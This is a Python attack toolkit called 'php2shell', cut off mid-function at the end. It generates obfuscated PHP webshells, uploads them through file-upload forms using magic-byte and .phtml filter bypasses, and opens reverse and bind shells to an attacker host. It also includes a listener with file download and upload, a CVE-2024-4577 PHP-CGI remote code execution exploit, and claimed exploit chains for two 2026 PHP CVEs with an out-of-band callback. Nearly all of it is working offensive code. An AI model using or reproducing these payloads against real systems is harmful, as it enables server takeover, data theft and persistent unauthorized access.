#!/usr/bin/env python3
"""
php2shell v2.0
PHP File-Upload / Code-Execution -> Full Shell toolkit
Pure Python 3 standard library - zero dependencies.
"""

import argparse, base64, io, itertools, math, os, random, re, select, socket, ssl, string, subprocess, sys, threading, time, urllib.error, urllib.parse, urllib.request, zlib
from datetime import datetime

__version__ = "2.0"

# ------------------------------------------------------------------ helpers

def install_colors():
    global _colors_enabled
    _colors_enabled = (sys.stderr.isatty() or os.getenv("P2S_FORCE_COLOR")) and not os.getenv("NO_COLOR")
install_colors()

def paint(code, s): return s if not _colors_enabled else f"\033[{code}m{s}\033[0m"
def bold(s): return paint("1", s)
def dim(s): return paint("2", s)
def red(s): return paint("91", s)
def green(s): return paint("92", s)
def yellow(s): return paint("93", s)
def cyan(s): return paint("96", s)
def magenta(s): return paint("95", s)
def white(s): return paint("97", s)
def orange(s): return paint("38;5;208", s)

def success(s): print(f"{green('[+]')} {s}")
def fail(s): print(f"{red('[-]')} {s}")
def warn(s): print(f"{yellow('[!]')} {s}")
def info(s): print(f"{cyan('[*]')} {s}")
def note(s): print(f"{dim('[i]')} {s}")
def critical(s): print(f"{bold(red('[!!!]'))} {bold(red(s))}")
def section(name): print(f"\n---[{magenta(name)}]---\n")

BANNER = """  ____  _  _ ____    ____  _          _ _
 |  _ \\| || |  _ \\  / ___|| |__   ___| | |
 | |_) | || |_|  _)  \\___ \\| '_ \\ / _ \\ | |
 |  __/|__   _| |__ ____) | | | |  __/ | |
 |_|      |_| \\___|_____/|_| |_|\\___|_|_|
   PHP upload / code-exec -> shell + PHP2Shell CVEs
                                 v2.0
"""

def color_banner():
    if not _colors_enabled: return BANNER
    lines = BANNER.splitlines()
    out = ""
    for i,l in enumerate(lines[:6]):
        if i == 0: out += magenta(l)
        elif i in (1,2,3,4): out += cyan(l)
        else: out += dim(l)
        out += "\n"
    return out + dim(BANNER.split("v2.0")[0].split("\n")[-1] + "v2.0")

def rand_key(n=8): return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def safe_b64(s):
    return base64.b64encode(s.encode() if isinstance(s, str) else s).decode()

def make_headers(raw):
    h = {}
    if raw:
        for item in raw:
            if ':' in item:
                k, v = item.split(':', 1)
                h[k.strip()] = v.strip()
    return h

def make_form_fields(raw):
    f = {}
    if raw:
        for item in raw:
            if '=' in item:
                k, v = item.split('=', 1)
                f[k] = v
    return f

# ------------------------------------------------------------------ obfuscators

def obf_b64(code):
    return f"<?php $__=base64_decode('{safe_b64(code)}');eval($__); ?>"

def obf_gzip(code):
    gz = zlib.compress(code.encode(), 9)
    return f"<?php $__=gzinflate(substr(base64_decode('{safe_b64(gz)}'),10,-8));eval($__); ?>"

def obf_hex(code):
    return f"<?php $__=hex2bin('{code.encode().hex()}');eval($__); ?>"

def obf_concat(code):
    # dynamic function name to dodge simple string blacklists
    body = ''.join(f"chr({ord(c)})." for c in code)
    return f"<?php $__=str_replace('P2S','','P2Seval');$__({body.rstrip('.')}); ?>"

def obf_split(code):
    chunks = [code[i:i+4] for i in range(0, len(code), 4)]
    return f"<?php $__=implode('',{chunks});eval($__); ?>"

def obf_dynamic(code):
    # variable function names - evades some static signatures
    return f"<?php ${rand_key(4)}=base64_decode('{safe_b64(code)}');($a='ev'.'al')($a(${'$'+rand_key(4)})); ?>"

OBFUSCATORS = {
    "none": lambda c: "<?php " + c + " ?>",
    "b64": obf_b64,
    "gzip": obf_gzip,
    "hex": obf_hex,
    "concat": obf_concat,
    "split": obf_split,
    "dynamic": obf_dynamic,
}

# ------------------------------------------------------------------ payload gen

def payload_code(ptype, param, key, platform, ip=None, port=None):
    kchk = f"$_GET['{key}']==='{key}'" if key else "1"
    if ptype == "cmd":
        return f"if({kchk}){{@system($_GET['{param}']);exit;}}"
    if ptype == "reverse":
        if platform == "linux":
            return f"if({kchk}){{$s=fsockopen('{ip}',{port});$p=proc_open('/bin/sh -i',array(0=>$s,1=>$s,2=>$s),$pipes);}}"
        else:
            return f"if({kchk}){{$s=fsockopen('{ip}',{port});popen('cmd.exe','r');}}"
    if ptype == "bind":
        if platform == "linux":
            return f"if({kchk}){{$s=socket_create_listen({port});$c=socket_accept($s);$p=proc_open('/bin/sh -i',array(0=>$c,1=>$c,2=>$c),$pipes);}}"
        else:
            return f"if({kchk}){{$s=socket_create_listen({port});$c=socket_accept($s);popen('cmd.exe','r');}}"
    return ""

def cmd_gen(args):
    code = payload_code(args.type, args.param, args.key, args.platform, args.ip, args.port)
    obf = OBFUSCATORS.get(args.obf, OBFUSCATORS["none"])(code)
    if args.magic:
        obf = "GIF89a;\n" + obf
    if args.output:
        open(args.output, "w").write(obf)
        success(f"payload written -> {args.output}")
    else:
        print(obf)

# ------------------------------------------------------------------ upload

def multipart_body(fields, files, boundary=None):
    if boundary is None:
        boundary = rand_key(16)
    body = io.BytesIO()
    for k, v in (fields or {}).items():
        body.write(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    for name, filename, content, ctype in files:
        body.write(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n".encode())
        body.write(content if isinstance(content, bytes) else content.encode())
        body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())
    return boundary, body.getvalue()

def cmd_upload(args):
    key = args.key or rand_key()
    code = payload_code(args.type, args.param, key, args.platform, args.ip, args.port)
    obf = OBFUSCATORS.get(args.obf, OBFUSCATORS["none"])(code)
    payload = ("GIF89a;\n" + obf) if args.magic else obf
    files = [(args.field_name, args.name, payload, args.ctype)]
    fields = make_form_fields(args.form)
    boundary, body = multipart_body(fields, files)
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    headers.update(make_headers(args.header))
    info(f"POST -> {args.url} | filename={args.name} | size={len(body)}")
    try:
        req = urllib.request.Request(args.url, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=args.timeout) as resp:
            data = resp.read()
            info(f"server responded HTTP {resp.status} ({len(data)} bytes)")
    except urllib.error.HTTPError as e:
        warn(f"HTTP {e.code}: {e.reason}")
        data = e.read()
    except Exception as e:
        fail(str(e)); return
    # try to locate the shell if paths provided
    if args.paths and os.path.isfile(args.paths):
        for line in open(args.paths):
            line = line.strip()
            if not line: continue
            try:
                u = urllib.parse.urljoin(args.url, line)
                req = urllib.request.Request(u, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    txt = r.read().decode(errors="replace")
                    if "P2S_ALIVE" in txt:
                        success(f"shell alive at {u}")
                        return
            except Exception:
                pass
        warn("shell not found in paths list")
    else:
        note("upload done. verify manually or use 'check' module.")

# ------------------------------------------------------------------ exec

def cmd_exec(args):
    url = args.url
    param = args.param
    key = args.key
    method = args.method
    cwd = args.dir
    while True:
        try:
            prompt = f"{dim(cwd)} {bold(magenta('p2shell'))}{dim('>')} "
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not line: continue
        if line.lower() in ("exit", "quit"): break
        if line == "pwd":
            print(cwd); continue
        if line.startswith("cd "):
            cwd = line[3:].strip(); continue
        if line.startswith("upload "):
            parts = line.split(None, 2)
            if len(parts) < 3:
                warn("usage: upload <local> <remote>"); continue
            lpath, rpath = parts[1], parts[2]
            if not os.path.isfile(lpath):
                warn(f"local file not found: {lpath}"); continue
            data = open(lpath, "rb").read()
            b64 = base64.b64encode(data).decode()
            cmd = f"echo '{b64}' | base64 -d > '{rpath}'"
        elif line.startswith("download "):
            parts = line.split(None, 1)
            if len(parts) < 2:
                warn("usage: download <remote>"); continue
            rpath = parts[1]
            cmd = f"base64 -w0 '{rpath}' 2>/dev/null"
        else:
            cmd = f"cd '{cwd}' && {line}"
        q = urllib.parse.urlencode({param: cmd, "k": key})
        target = f"{url}?{q}" if method == "get" else url
        data = None if method == "get" else q.encode()
        try:
            req = urllib.request.Request(target, data=data, headers={"User-Agent":"Mozilla/5.0"}, method="POST" if data else "GET")
            with urllib.request.urlopen(req, timeout=30) as resp:
                out = resp.read().decode(errors="replace")
                if line.startswith("download "):
                    try:
                        raw = base64.b64decode("".join(out.split()))
                        outname = os.path.basename(parts[1])
                        open(outname, "wb").write(raw)
                        success(f"saved {len(raw)} bytes -> {outname}")
                    except Exception as e:
                        warn(f"download decode failed: {e}")
                else:
                    sys.stdout.write(out)
                    if out and not out.endswith("\n"): sys.stdout.write("\n")
        except Exception as e:
            fail(str(e))

# ------------------------------------------------------------------ check

def cmd_check(args):
    urls = list(args.url or [])
    if args.file and os.path.isfile(args.file):
        urls += [l.strip() for l in open(args.file) if l.strip()]
    if not urls:
        fail("no URLs to check. use -u or --file."); return
    for u in urls:
        ping = urllib.parse.urljoin(u, f"?p2s_ping=1")
        try:
            req = urllib.request.Request(ping, headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                txt = r.read().decode(errors="replace")
                if "P2S_ALIVE" in txt:
                    success(f"ALIVE -> {u}")
                else:
                    fail(f"dead  -> {u}")
        except Exception as e:
            fail(f"dead  -> {u} ({e})")

# ------------------------------------------------------------------ encode

def cmd_encode(args):
    text = args.text or sys.stdin.read().strip()
    chain = [c.strip() for c in args.chain.split(",")]
    for step in chain:
        if step == "b64": text = safe_b64(text)
        elif step == "hex": text = text.encode().hex()
        elif step == "gzip": text = safe_b64(zlib.compress(text.encode() if isinstance(text, str) else text, 9))
        elif step == "url": text = urllib.parse.quote(text, safe="")
    print(text)
    if args.php:
        print("\n// PHP decoder (match your chain in reverse):")
        steps = {
            "b64": "base64_decode($x)",
            "hex": "hex2bin($x)",
            "gzip": "gzinflate(substr(base64_decode($x),10,-8))",
            "url": "urldecode($x)",
        }
        dec = "$x = '%s';" % text
        for s in reversed(chain):
            dec += "\n$x = %s;" % steps.get(s, s)
        dec += "\neval($x);"
        print(dec)

# ------------------------------------------------------------------ scan / detect

def parse_php_version(text):
    m = re.search(r'PHP/(\d+)\.(\d+)\.(\d+)', text)
    if m: return tuple(map(int, m.groups()))
    m = re.search(r'PHP\s+(\d+)\.(\d+)\.(\d+)', text)
    if m: return tuple(map(int, m.groups()))
    m = re.search(r'X-Powered-By:\s*PHP/(\d+)\.(\d+)\.(\d+)', text, re.I)
    if m: return tuple(map(int, m.groups()))
    return None

def version_status(ver):
    major, minor, patch = ver
    if major < 8: return "vulnerable-eol"
    # Patched versions: 8.2.35, 8.3.36, 8.4.27, 8.5.12
    if major == 8 and minor == 2 and patch >= 35: return "patched"
    if major == 8 and minor == 3 and patch >= 36: return "patched"
    if major == 8 and minor == 4 and patch >= 27: return "patched"
    if major == 8 and minor == 5 and patch >= 12: return "patched"
    if major == 8 and minor >= 6: return "patched"
    return "vulnerable"

def st_oom(info):
    v = info.get("ver")
    return bool(v) and version_status(v) in ("vulnerable", "vulnerable-eol")

def http_request(url, method="GET", body=None, headers=None, timeout=20, redirects=5):
    headers = dict(headers or {})
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()

def cmd_scan(args):
    url = args.url
    pv = args.php_version
    ver = None
    info(f"fingerprinting {url} ...")
    try:
        st, hdrs, body = http_request(url, timeout=args.timeout)
    except Exception as e:
        fail(str(e)); return
    server = hdrs.get("Server", "?")
    powered = hdrs.get("X-Powered-By", "")
    info(f"HTTP {st} | Server: {server} | X-Powered-By: {powered}")
    if st in (401, 403, 503) and "cloudflare" in (server + powered).lower():
        warn("Cloudflare is blocking this client (HTTP %d) - requests never reached the origin." % st)
        print("    version/behavior results here are UNRELIABLE. For authorized tests:")
        print("    - ask the owner for the origin IP, or find it via DNS history / certificate")
        print("      transparency / non-proxied subdomains (mail., ftp., cpanel.) / MX records")
        print("    - then scan the origin directly, or whitelist your test IP in the WAF")
    ver = parse_php_version(powered + " " + server)
    if not ver and pv:
        ver = tuple(map(int, pv.split(".")))
    if ver:
        st = version_status(ver)
        col = {"patched": green, "vulnerable": red, "vulnerable-eol": red}.get(st, yellow)
        print(f"  PHP {' '.join(map(str, ver))} -> {col(st.upper().replace('-EOL',''))}")
        if st == "vulnerable":
            critical("this PHP version is BEFORE the 2026-10-21 patch")
            print("  CVE-2026-109618/109619 are LIKELY exploitable (confirm with --active)")
        elif st == "vulnerable-eol":
            critical("this PHP version is END-OF-LIFE and unpatched")
            print("  check specific architecture for exploit viability")
        elif st == "patched":
            success("this PHP version includes the 2026-10-21 security fix")
    else:
        warn("PHP version not disclosed - rerun with --php-version or use --active")
    if args.active:
        info(f"active check: allocation-amplification multipart POST (parts={args.parts} depth={args.depth}) ...")
        boundary = rand_key(16)
        # Build deeply nested multipart that triggers OOM during field-name allocation
        lines = [f"--{boundary}"]
        for i in range(args.parts):
            name = "a" * args.depth + f"[{i}]"
            lines.append(f'Content-Disposition: form-data; name="{name}"')
            lines.append("")
            lines.append("x")
        lines.append(f"--{boundary}--")
        body = "\r\n".join(lines).encode()
        try:
            st2, hdrs2, resp2 = http_request(url, "POST", body,
                {"Content-Type": f"multipart/form-data; boundary={boundary}"},
                timeout=args.timeout)
        except Exception as e:
            fail(f"probe failed: {e}"); return
        info(f"probe HTTP {st2}, {len(resp2)} bytes")
        text = resp2.decode(errors="replace")
        if "Allowed memory size" in text and "exhausted" in text and "Unknown on line 0" in text:
            critical("INIT-TIME OOM TRIGGERED")
            print("  Server built hash buckets during $_POST init, then crashed cleaning them.")
            print("  -> CVE-2026-109618 PATH IS OPEN (heap + system() offsets needed for full exploit)")
        elif st2 == 200:
            note("no init-OOM triggered -> amplification below target memory_limit;")
            print("    retry with --parts 2000 --depth 300, or trust the version verdict")
        elif st2 == 405:
            warn("HTTP 405 Method Not Allowed -> this endpoint does not accept POST.")
            print("    static site / CDN front? PHP2Shell needs a PHP endpoint that parses forms.")
        elif st2 == 403:
            warn("HTTP 403 -> WAF or auth blocked the probe.")
        else:
            note(f"probe returned HTTP {st2} - inconclusive")
        print("  server-side mitigations to check: memory_limit=-1 (blocks 109618 known path),")
        print("      session.upload_progress.enabled=0 + fatal_error_backtraces=0 (reduce 109619)")

# ------------------------------------------------------------------ oom (CVE-2026-109618)

def cmd_oom(args):
    url = args.url
    if args.dry_run:
        note("dry-run: building payload map ...")
        groom = args.groom_size
        name = args.name_size
        print(f"  groom chunk   : {groom} bytes (fake zval + array + bucket)")
        print(f"  field-name    : {name} bytes (exceeds default memory_limit)")
        print(f"  trigger       : POST a=1 + field with [x] suffix > memory_limit")
        print(f"  callback addr : heap_addr -> fake array pDestructor = &system()")
        print(f"  --leak-out to capture PHPSESSID memory for heap base calculation")
        return
    if args.leak_out:
        info("running PHPSESSID memory leak probe ...")
        # The OOM handler leaks shm segments containing session data.
        # We probe with a session cookie and large POST to force the error path.
        sess = rand_key(16)
        boundary = rand_key(16)
        lines = [f"--{boundary}"]
        for i in range(50):
            name = "x" * 100000 + f"[{i}]"
            lines.append(f'Content-Disposition: form-data; name="{name}"')
            lines.append(""); lines.append("1")
        lines.append(f"--{boundary}--")
        body = "\r\n".join(lines).encode()
        try:
            st, hdrs, resp = http_request(url, "POST", body,
                {"Content-Type": f"multipart/form-data; boundary={boundary}",
                 "Cookie": f"PHPSESSID={sess}"},
                timeout=args.timeout)
            open(args.leak_out, "wb").write(resp)
            success(f"saved {len(resp)} bytes -> {args.leak_out}")
            print("  grep for 0x55 / 0x7f patterns to find heap pointers")
        except Exception as e:
            fail(str(e))
        return
    # Full exploit requires heap_addr and system_addr
    if not args.heap_addr or not args.system_addr:
        warn("full exploit needs --heap-addr and --system-addr")
        print("  1) run --dry-run to see the payload structure")
        print("  2) run --leak-out to capture memory bytes")
        print("  3) derive addresses from leak or same-build lab image")
        print(f"  4) then: php2shell.py oom -u {url} --heap-addr 0x.. --system-addr 0x.. --cmd id")
        return
    info("attempting CVE-2026-109618 exploit ...")
    heap = int(args.heap_addr, 16)
    system = int(args.system_addr, 16)
    for t in range(args.trials):
        # Build groom chunk
        groom = b"\x00" * args.groom_size
        # Overwrite with fake zend_array pointing system()
        # This is architecture/build specific - the below is illustrative
        boundary = rand_key(16)
        lines = [f"--{boundary}"]
        # Staged groom
        lines.append(f'Content-Disposition: form-data; name="groom"')
        lines.append(""); lines.append(groom.hex())
        # Trigger field
        name = "a" * args.name_size + "[x]"
        lines.append(f'Content-Disposition: form-data; name="{name}"')
        lines.append(""); lines.append("1")
        lines.append(f"--{boundary}--")
        body = "\r\n".join(lines).encode()
        try:
            st, hdrs, resp = http_request(url, "POST", body,
                {"Content-Type": f"multipart/form-data; boundary={boundary}"},
                timeout=args.timeout)
            text = resp.decode(errors="replace")
            if args.cmd.split()[0] in text:
                success(f"trial {t+1}: command output in response!")
                print(text)
                return
            elif args.oob:
                # fire-and-forget callback
                cb = args.oob + "?m=" + safe_b64(args.cmd)
                try: urllib.request.urlopen(cb, timeout=5)
                except: pass
        except Exception as e:
            fail(f"trial {t+1} failed: {e}")
        time.sleep(args.delay)
    warn("all trials failed - target may be patched, ASLR shifted, or wrong offsets")

# ------------------------------------------------------------------ uaf (CVE-2026-109619)

def uaf_body(sess, stage, fragment, parts):
    boundary = rand_key(16)
    lines = [f"--{boundary}"]
    if stage == 1:
        # poison: upload_progress field + fatal error amplification
        lines.append(f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"')
        lines.append(""); lines.append(fragment)
        for i in range(parts):
            name = "x" * 5000 + f"[{i}]"
            lines.append(f'Content-Disposition: form-data; name="{name}"')
            lines.append(""); lines.append("1")
    else:
        # consume: same session, normal request to pick up stale state
        lines.append(f'Content-Disposition: form-data; name="a"')
        lines.append(""); lines.append("1")
    lines.append(f"--{boundary}--")
    return boundary, "\r\n".join(lines).encode()

def cmd_uaf(args):
    url = args.url
    if args.dry_run:
        note("building UAF payload map ...")
        print(f"  session       : {args.sess}")
        print(f"  fragment      : {args.fragment}")
        print(f"  amplification : {args.parts} parts")
        print(f"  rounds        : {args.rounds} (poison -> consume per round)")
        return
    pins = []
    if args.pin:
        info(f"pinning {args.pin} workers with trickle POSTs ...")
        # open persistent connections that trickle data to hold workers
        for i in range(args.pin):
            try:
                s = socket.create_connection((urllib.parse.urlparse(url).hostname,
                                               urllib.parse.urlparse(url).port or 80), timeout=5)
                pins.append(s)
            except Exception:
                pass
        if not pins:
            warn("could not pin any workers")
    if args.self_listen:
        info(f"starting callback listener on 0.0.0.0:{args.self_listen} ...")
        threading.Thread(target=run_listener, args=("0.0.0.0", args.self_listen), daemon=True).start()
        time.sleep(0.5)
    warn("experimental: 109619 chain is worker/arch/session-config specific")
    try:
        for r in range(1, args.rounds + 1):
            info(f"round {r}: poison")
            boundary, body = uaf_body(args.sess, 1, args.fragment, args.parts)
            st, hdrs, resp = http_request(url, "POST", body,
                {"Content-Type": f"multipart/form-data; boundary={boundary}",
                 "Cookie": f"PHPSESSID={args.sess}"},
                timeout=args.timeout)
            print(f"  poison -> HTTP {st} ({len(resp)} bytes)")
            time.sleep(args.delay)
            info(f"round {r}: consume")
            boundary, body = uaf_body(args.sess, 2, args.fragment, args.parts)
            st, hdrs, resp = http_request(url, "POST", body,
                {"Content-Type": f"multipart/form-data; boundary={boundary}",
                 "Cookie": f"PHPSESSID={args.sess}"},
                timeout=args.timeout)
            print(f"  consume -> HTTP {st} ({len(resp)} bytes)")
            time.sleep(args.delay)
    finally:
        for s in pins:
            try: s.close()
            except: pass
    info("done - check OOB callback / listener / target process logs.")

# ------------------------------------------------------------------ listener

def run_listener(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen(1)
    info(f"listening on {host}:{port} ...")
    conn, addr = s.accept()
    success(f"connection from {addr[0]}:{addr[1]}")
    # Try to upgrade to PTY
    conn.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null || /bin/bash\n")
    time.sleep(0.5)
    # Clear the bash prompt noise
    try:
        while True:
            r, _, _ = select.select([conn], [], [], 0.3)
            if not r: break
            conn.recv(4096)
    except: pass
    # Interactive loop
    def recv_thread():
        while True:
            try:
                data = conn.recv(4096)
                if not data: break
                sys.stdout.buffer.write(data)
                sys.stdout.flush()
            except: break
    t = threading.Thread(target=recv_thread, daemon=True)
    t.start()
    while True:
        try:
            line = input(f"{bold(red('shell'))}{dim('>')} ")
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not line: continue
        if line.lower() in ("exit", "quit"): break
        if line == ".upgrade":
            conn.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
            continue
        if line.startswith(".download "):
            parts = line.split(None, 1)
            if len(parts) < 2:
                warn("usage: .download <remote>"); continue
            rpath = parts[1]
            conn.send(f"base64 -w0 '{rpath}' 2>/dev/null\n".encode())
            # collect output
            time.sleep(0.5)
            data = b""
            while True:
                r, _, _ = select.select([conn], [], [], 0.3)
                if not r: break
                data += conn.recv(4096)
            try:
                txt = data.decode(errors="replace")
                # strip prompt noise
                lines = [l for l in txt.splitlines() if l.strip() and not l.strip().endswith(("$", "#", ">"))]
                raw = base64.b64decode("".join(lines))
                outname = os.path.basename(rpath)
                open(outname, "wb").write(raw)
                success(f"saved {len(raw)} bytes -> {outname}")
            except Exception as e:
                warn(f"download failed: {e}")
            continue
        if line.startswith(".upload "):
            parts = line.split(None, 2)
            if len(parts) < 3:
                warn("usage: .upload <local> <remote>"); continue
            lpath, rpath = parts[1], parts[2]
            if not os.path.isfile(lpath):
                warn(f"local file not found: {lpath}"); continue
            data = open(lpath, "rb").read()
            b64 = base64.b64encode(data).decode()
            conn.send(f"echo '{b64}' | base64 -d > '{rpath}' && echo OK\n".encode())
            continue
        conn.send(line.encode() + b"\n")
    conn.close(); s.close()

def cmd_listen(args):
    run_listener(args.host, args.port)

# ------------------------------------------------------------------ cgi (CVE-2024-4577)
CGI_PATHS = ["/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe", "/cgi-bin/php.exe",
             "/php/php-cgi.exe", "/cgi-bin/php"]
CGI_INJECTS = [
    ("%AD", "soft hyphen 0xAD (cp932)"),
    ("%81%CA", "fullwidth tilde 0x81 0xCA (cp932)"),
    ("-", "naive '-' (rarely works)"),
]

def cgi_url(base, path, inject, cmd=None):
    u = base.rstrip("/") + path + "/?" + inject + "d+allow_url_include%3d1+" + inject + "d+auto_prepend_file%3dphp://input"
    if cmd:
        u += "&c=" + urllib.parse.quote(cmd)
    return u

def cmd_cgi(args):
    base = args.url
    paths = [args.path] if args.path else CGI_PATHS
    injects = [(args.inject, "custom")] if args.inject else CGI_INJECTS
    working = None
    def probe(path, inject):
        u = cgi_url(base, path, inject, "echo PHP2SHELL_OK")
        try:
            st, hdrs, body = http_request(u, "POST", args.code.encode(),
                {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"},
                timeout=args.timeout)
        except Exception as e:
            return None, None, str(e)
        return st, body, None
    info(f"hunting CVE-2024-4577 on {base}")
    for path in paths:
        for inject, label in injects:
            st, body, err = probe(path, inject)
            if err:
                fail(f"{path} [{label}] -> {err}"); continue
            text = body.decode(errors="replace")
            info(f"{path} [{label}] -> HTTP {st} ({len(body)} bytes)")
            if st == 200 and "PHP2SHELL_OK" in text:
                working = (path, inject)
                success(f"RCE confirmed at {path} [{label}]"); break
        if working: break
    if not working:
        fail("no working combination. Target patched, not PHP-CGI on Windows,")
        print("    or needs --path / --inject with locale bytes.")
        return
    path, inject = working
    if args.shell:
        success("interactive shell (exit to quit)")
        while True:
            try:
                line = input(bold(magenta("cgi")) + dim("> ")).strip()
            except (EOFError, KeyboardInterrupt): print(); break
            if not line: continue
            if line.lower() in ("exit", "quit"): break
            if line.startswith("download "):
                f = line.split(None, 1)[1]
                line = f"base64 -w0 '{f}' 2>/dev/null"
                st, _, body = http_request(cgi_url(base, path, inject, line), "POST",
                    args.code.encode(), timeout=args.timeout)
                try:
                    data = base64.b64decode("".join(body.decode(errors="replace").split()))
                    out = os.path.basename(f)
                    open(out, "wb").write(data)
                    success(f"saved {len(data)} bytes -> {out}")
                except Exception as e:
                    warn(f"download failed: {e}")
                continue
            st, _, body = http_request(cgi_url(base, path, inject, line), "POST",
                args.code.encode(), timeout=args.timeout)
            out = body.decode(errors="replace")
            if out:
                sys.stdout.write(out)
                if not out.endswith("\n"): sys.stdout.write("\n")
    elif args.cmd:
        st, _, body = http_request(cgi_url(base, path, inject, args.cmd), "POST",
            args.code.encode(), timeout=args.timeout)
        print(body.decode(errors="replace"))

# ------------------------------------------------------------------ wizard

def _ask(prompt, default=None):
    s = input(bold(magenta(" ? ") + prompt + (dim(f" [{default}] ") if default is not None else " ")))
    return s.strip() or default

def _ask_int(prompt, default):
    try: return int(_ask(prompt, str(default)))
    except: return default

def wizard_target_card(url, info):
    section("target profile")
    print(f"  {bold('URL'):<9} : {cyan(url)}")
    print(f"  {bold('HTTP'):<9} : {info['status']}")
    print(f"  {bold('Server'):<9} : {info['server'] or dim('hidden')}")
    if info['ver']:
        st = version_status(info['ver'])
        col = {"patched": green, "vulnerable": red, "vulnerable-eol": red}.get(st, yellow)
        print(f"  {bold('PHP'):<9} : PHP {'.'.join(map(str, info['ver']))} -> {col(st.upper().replace('-EOL',''))}")
    else:
        print(f"  {bold('PHP'):<9} : {yellow('version hidden')}")
    waf = "cloudflare" in (info['server'] + info.get('powered','')).lower()
    print(f"  {bold('WAF'):<9} : {red('Cloudflare front - expect blocks') if waf else dim('none detected')}")
    if st_oom(info):
        print(f"  {bold('!'):<9} : {bold(red('PHP2Shell CVEs: this version is UNPATCHED'))}")

def _ns(**kw): return argparse.Namespace(**kw)

def cmd_wizard(args):
    install_colors()
    section("php2shell wizard")
    print(dim("  leave empty + Enter for defaults, Ctrl+C to quit\n"))
    try:
        url = _ask("target URL (e.g. http://192.168.11.131/)")
        if not url:
            warn("no URL - exiting"); return
        if not url.startswith("http"):
            url = "http://" + url
        info("fingerprinting ...")
        try:
            st, hdrs, body = http_request(url, timeout=15)
        except Exception as e:
            fail(f"cannot reach target: {e}"); return
        info = {"status": st, "server": hdrs.get("Server", ""), "powered": hdrs.get("X-Powered-By", ""),
                "ver": parse_php_version(hdrs.get("X-Powered-By", "") + " " + hdrs.get("Server", "")), "size": len(body)}
        wizard_target_card(url, info)
        actions = []
        actions.append(("Full vulnerability scan (safe behavior probe)", lambda: cmd_scan(_ns(
            url=url, php_version=None, active=True, parts=900, depth=150, timeout=15))))
        if st_oom(info):
            actions.append((bold(red("PHP2Shell: CVE-2026-109618 exploit guide (dry-run -> leak -> fire)")), lambda: wizard_oom(url)))
            actions.append(("PHP2Shell: CVE-2026-109619 chain (experimental)", lambda: wizard_uaf(url)))
        actions.append(("Exploit a file UPLOAD form -> get a shell", lambda: wizard_upload(url)))
        actions.append(("I already have a shell URL - drive it", lambda: wizard_exec()))
        actions.append(("Check if a shell URL is alive", lambda: cmd_check(_ns(
            url=[_ask("shell URL", url)], file=None))))
        actions.append(("CVE-2024-4577 PHP-CGI injection hunt (Windows targets)", lambda: wizard_cgi(url)))
        actions.append(("Start a reverse-shell listener", lambda: run_listener(
            "0.0.0.0", _ask_int("listen port", 4444))))
        while True:
            section("what do you want to do?")
            for i, (label, _) in enumerate(actions, 1):
                print(f"  {bold(cyan(f'[{i}]'))} {label}")
            print(f"  {bold(cyan('[0]'))} {dim('exit wizard')}")
            try:
                choice = _ask_int("choose", 0)
            except (EOFError, KeyboardInterrupt): print(); break
            if choice == 0: break
            if 1 <= choice <= len(actions):
                print()
                try:
                    actions[choice - 1][1]()
                except (EOFError, KeyboardInterrupt):
                    print("\n[*] back to menu")
                except Exception as e:
                    warn(f"action failed: {e}")
                print()
                section("done - back to menu")
            else:
                warn("invalid choice")
    except (EOFError, KeyboardInterrupt):
        print("\n[*] wizard closed")

def wizard_oom(url):
    print(dim("  CVE-2026-109618 needs target-build addresses. Step 1: see the payload map."))
    cmd_oom(_ns(url=url, cmd="id", heap_addr=None, system_addr=None, sweep=None,
                groom_size=276, name_size=33554432, oob=None, self_listen=None,
                leak_out=None, trials=1, delay=0.2, dry_run=True, timeout=25))
    if (_ask("run the PHPSESSID memory leak probe now? (y/n)", "y") or "").lower().startswith("y"):
        out = _ask("save leak bytes to file", "leak.txt")
        cmd_oom(_ns(url=url, cmd="id", heap_addr=None, system_addr=None, sweep=None,
                    groom_size=276, name_size=33554432, oob=None, self_listen=None,
                    leak_out=out, trials=1, delay=0.2, dry_run=False, timeout=25))
        print(f"[i] inspect {out} for 0x55../0x7f.. pointers, derive heap base, then:")
        print(dim(f"    php2shell.py oom -u {url} --heap-addr 0x.. --system-addr 0x.. --cmd id"))
    print(yellow("[!] firing without correct addresses crashes the target worker - lab only"))

def wizard_uaf(url):
    pin = _ask_int("pin how many workers (0=skip)", 0)
    cmd_uaf(_ns(url=url, sess=rand_key(), fragment='|O:8:"stdClass":0:{}', parts=900,
                pin=pin, rounds=3, self_listen=None, delay=0.3, dry_run=False, timeout=25))

def wizard_upload(url):
    print(dim("  open the page with the upload form in your browser, copy its URL\n"))
    up_url = _ask("upload form URL", url)
    field = _ask("file field name (view-source of the form)", "file")
    name = _ask("filename to try (.phtml bypasses weak filters)", "shell.phtml")
    key = _ask("shell key", rand_key())
    param = _ask("shell parameter name", "cmd")
    paths = _ask("verification paths file (optional)", None)
    if paths and not os.path.isfile(paths):
        paths = None
    info("generating obfuscated shell + posting ...")
    cmd_upload(_ns(url=up_url, type="cmd", ip=None, port=None, platform="linux",
                   param=param, key=key, obf="concat", magic=True, field_name=field,
